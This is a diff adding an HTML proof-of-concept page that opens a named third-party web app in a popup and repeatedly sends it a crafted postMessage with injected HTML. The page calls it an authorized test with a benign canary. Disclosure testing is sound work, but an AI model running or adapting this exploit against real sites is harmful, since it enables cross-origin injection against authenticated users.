@@ -1,0 +1,60 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Cortex postMessage chain test</title>
+  <style>
+    body { max-width: 52rem; margin: 3rem auto; padding: 0 1.25rem; font: 17px/1.55 system-ui, sans-serif; color: #172033; }
+    button { padding: .7rem 1rem; font: inherit; cursor: pointer; }
+    code, pre { background: #eef2f7; border-radius: .3rem; }
+    code { padding: .15rem .35rem; }
+    pre { padding: 1rem; white-space: pre-wrap; }
+  </style>
+</head>
+<body>
+  <h1>Authorized postMessage chain test</h1>
+  <p>This page sends a benign HTML canary to the Cortex <code>LinkFrame_VForm</code> window. It does not read data or perform account actions.</p>
+  <button id="run" type="button">Open Meta Cortex and send canary</button>
+  <pre id="status">Idle.</pre>
+  <script>
+    const target = "https://cortex.atmeta.com/C.aspx?VP3=CMS3&VF=LinkFrame_VForm&URL=https%3A%2F%2Fexample.com";
+    const status = document.getElementById("status");
+
+    document.getElementById("run").addEventListener("click", () => {
+      const victim = window.open(target, "cortex_pm_chain_target");
+      if (!victim) {
+        status.textContent = "The Cortex popup was blocked.";
+        return;
+      }
+
+      const message = {
+        Name: "FireNotification",
+        Payload: JSON.stringify({
+          Message: "<strong id='atmeta-co-pm-canary'>POSTMESSAGE_CHAIN_CANARY_2026_10_09</strong><br>Origin: cortex.atmeta.co",
+          Title: "Controlled cross-origin message",
+          Timeout: 60000,
+          Type: "info",
+          ShowClose: true,
+          Buttons: [],
+          NotificationID: "atmeta-co-pm-canary",
+          Theme: "light"
+        })
+      };
+
+      let sent = 0;
+      const timer = setInterval(() => {
+        if (victim.closed || sent >= 12) {
+          clearInterval(timer);
+          status.textContent += "\nFinished.";
+          return;
+        }
+        victim.postMessage(message, "https://cortex.atmeta.com");
+        sent += 1;
+        status.textContent = `Sent benign canary ${sent}/12. If the victim is authenticated, the Meta Cortex window should display POSTMESSAGE_CHAIN_CANARY_2026_10_09.`;
+      }, 750);
+    });
+  </script>
+</body>
+</html>
